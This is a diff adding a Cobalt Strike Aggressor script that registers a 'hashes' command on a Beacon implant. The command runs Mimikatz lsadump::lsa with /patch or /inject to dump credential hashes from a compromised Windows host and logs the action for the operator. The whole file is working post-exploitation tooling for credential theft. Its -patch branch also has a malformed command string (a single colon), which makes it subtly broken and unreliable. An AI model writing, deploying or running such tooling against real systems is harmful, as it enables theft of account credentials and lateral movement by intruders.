@@ -1,0 +1,69 @@
+#	ALIAS:	HASHES
+# Build in Protection if there is LSAIso Running.
+
+alias("hashes", {
+		local('@icb');
+		# Check for Number of Arguements
+		if (size(@_) > 2) {
+			berror($1, "hashes: Too many arguments");
+			beacon_command_detail("hashes");
+			return;
+		}
+		
+		# Task
+		try {
+			
+			# Print Information to Beacon Console.
+			binput($1, "[ Getting Hashes via Mimikatz LSADump ]");
+			
+			# Beginning Task
+			btask($1, "Getting Hashes via Mimikatz LSADump (T000)", "T000");
+			
+			# Log Tasking to Event Log.
+			elog("\cC[+] Getting Hashes via Mimikatz LSADump on Implant ID: \o" . beacon_info( $1 , "id" ) . " (" . beacon_info($1, "computer") . ")");
+			
+			# Print Information to Script Console.
+			println(
+				"\nPRINTED INFORMATION: HASHES => "          . beacon_info($1, "id") . " (" . beacon_info($1, "computer") . ")"
+				. "\nGetting Hashes via Mimikatz LSADump."
+			);
+			
+			# Print Results to Beacon Console.
+			local('$args');
+
+			if ($2 eq "-patch") {
+				$args = "!lsadump:lsa /patch";
+			}
+			else if ($2 eq "-inject") {
+				$args = "!lsadump::lsa /inject";
+			}
+			else {
+				berror($1, "Invalid argument!");
+				beacon_command_detail("hashes");
+				return;
+			}
+			bmimikatz($1, $args);
+			# Task Complete
+			
+		}
+		catch $exception {
+			
+			#Print Error to Script Console.
+			println(
+				"\nERROR INFORMATION: HASHES => " . beacon_info($1, "id") . " (" . beacon_info($1, "computer") . ")"
+				. "\HASHES: " . $exception
+			);
+			
+			# Print Error and Return.
+			berror($1, "HASHES: " . $exception);
+			return;
+		}
+	}
+);
+
+#	ALIAS REGISTER: TEMPLATE
+beacon_command_register(
+	"hashes", 
+	"\c2[*] ALIAS: Runs a mimikatz command {Availiable Args: -patch , -inject}\o",
+	"Synopsis: hashes [-patch|-inject]\n\n-patch: 'mimikatz !lsadump::lsa /patch'\n-inject: 'mimikatz !lsadump::lsa /inject'"
+);
